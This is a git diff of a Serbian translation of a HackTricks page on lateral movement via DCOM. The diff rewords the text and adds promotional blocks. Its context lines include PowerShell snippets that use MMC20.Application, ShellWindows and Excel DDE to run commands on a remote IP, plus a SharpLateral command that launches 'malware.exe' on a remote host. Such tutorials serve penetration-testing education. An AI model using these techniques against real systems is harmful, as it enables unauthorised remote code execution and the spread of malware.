@@ -1,16 +1,24 @@
-# DCOM Izvršenje
+# DCOM Exec
 
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite da imate pristup **najnovijoj verziji PEASS ili preuzmete HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud)..
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## MMC20.Application
 
@@ -21,9 +29,9 @@ Model distribuiranih komponentnih objekata (DCOM) predstavlja zanimljivu mogućn
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava pisanje skriptova za MMC snap-in operacije. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu može se pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:
+COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje MMC snap-in operacija. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu može se pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:
 
-Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Za interakciju sa DCOM-om na daljinu kao administrator, PowerShell se može koristiti na sledeći način:
+Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Za interakciju sa DCOM-om na daljinu kao admin, PowerShell se može koristiti na sledeći način:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
@@ -47,12 +55,12 @@ ls \\10.10.10.10\c$\Users
 
 **Za više informacija o ovoj tehnici pogledajte originalni post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions", podrazumevajući dozvole koje dozvoljavaju pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET za filtriranje objekata bez eksplicitnih Launch Permission.
+Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions", podrazumevajući dozvole koje dozvoljavaju pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitnih Launch Permission.
 
 Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, istaknuta su zbog nedostatka eksplicitnih Launch Permissions. Odsustvo unosa `LaunchPermission` u registru pod `HKCR:\AppID\{guid}` označava nedostatak eksplicitnih dozvola.
 
 ###  ShellWindows
-Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` olakšavaju instanciranje objekta koristeći njegov AppID. Ovaj proces koristi OleView .NET za dobijanje CLSID-a za `ShellWindows`. Jednom kada je instanciran, interakcija je moguća putem metode `WindowsShell.Item`, što dovodi do poziva metoda poput `Document.Application.ShellExecute`.
+Za `ShellWindows`, koji nema ProgID, .NET metode `Type.GetTypeFromCLSID` i `Activator.CreateInstance` olakšavaju instanciranje objekta koristeći njegov AppID. Ovaj proces koristi OleView .NET za dobijanje CLSID-a za `ShellWindows`. Jednom kada je instanciran, interakcija je moguća kroz metod `WindowsShell.Item`, što dovodi do poziva metoda poput `Document.Application.ShellExecute`.
 
 Dati su primeri PowerShell komandi za instanciranje objekta i izvršavanje komandi na daljinu:
 ```powershell
@@ -88,13 +96,13 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Alatke za automatizaciju bočnog kretanja
+### Alatke za automatizaciju Lateralnog Kretanja
 
 Dve alatke su istaknute za automatizaciju ovih tehnika:
 
 - **Invoke-DCOM.ps1**: PowerShell skripta koju pruža Empire projekat koja pojednostavljuje pozivanje različitih metoda za izvršavanje koda na udaljenim mašinama. Ova skripta je dostupna na Empire GitHub repozitorijumu.
 
-- **SharpLateral**: Alatka dizajnirana za izvršavanje koda na daljinu, koja se može koristiti sa komandom:
+- **SharpLateral**: Alatka dizajnirana za udaljeno izvršavanje koda, koja se može koristiti sa komandom:
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
@@ -110,13 +118,19 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ČLANSTVO**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
